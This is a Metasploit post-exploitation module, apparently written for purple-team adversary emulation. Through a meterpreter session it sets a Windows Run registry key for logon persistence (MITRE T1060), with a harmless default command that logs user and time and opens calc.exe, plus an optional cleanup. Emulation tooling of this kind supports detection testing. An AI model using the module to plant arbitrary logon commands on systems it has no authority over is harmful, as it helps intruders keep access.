##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
    include Msf::Post::Windows::Priv

    def initialize(info={})
      super(update_info(info,
                        'Name'          => 'Run Keys (T1060) Windows - Purple Team',
                        'Description'   => %q{
                          Persistence, Lateral Movement:
                          Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. The program will be executed under the context of the user and will have the account's associated permissions level. Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.},
                        'License'       => MSF_LICENSE,
                        'Author'        => [ 'Praetorian' ],
                        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1060' ] ],
                        'Platform'      => [ 'win' ],
                        'SessionTypes'  => [ 'meterpreter' ]
                       ))
      register_options(
      [
        OptString.new("CMD", [true, "Command to execute on login.", "cmd /c echo T1060 > C:\\t1060.txt && whoami >> C:\\t1060.txt && date /t >> C:\\t1060.txt && time /t >> C:\\t1060.txt && calc.exe"]),
        OptString.new("KEY_BASE", [true, "Windows Run Key to modify.", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"]),
        OptString.new("KEY_VAL", [true, "Windows Run Key Val to modify.", "t1060"]),
        OptBool.new("CLEANUP", [true, "Remove the registry key immediately after adding it.", false])
      ])
    end

    def run
    #
    # This module provides options for setting the various Windows run keys.
    # Various options for setting the default exe and which run key exist.
    #
      begin
        raise "Module requires meterpreter session." unless session.type == "meterpreter"

        reg_base_key = datastore['KEY_BASE']
        reg_base_val = datastore['KEY_VAL']

        # add the logon script
        print_status("Adding #{datastore['CMD']} to #{reg_base_key}\\#{reg_base_val}")
        if registry_setvaldata(reg_base_key, reg_base_val, datastore['CMD'], "REG_SZ")
          print_good("Success! To test persistence, log out and then log in.")
        else
          raise 'Failure adding registry entry.'
        end

        # cleanup if we need to
        if datastore['CLEANUP']
          print_status("Deleting added key.")
          registry_deleteval(reg_base_key, reg_base_val)
        end

        print_good("Module T1060W execution successful.")

      rescue ::Exception => e
        print_error("#{e.class}: #{e.message}")
        print_error("Module T1060W execution failed.")
      end

    end
  end
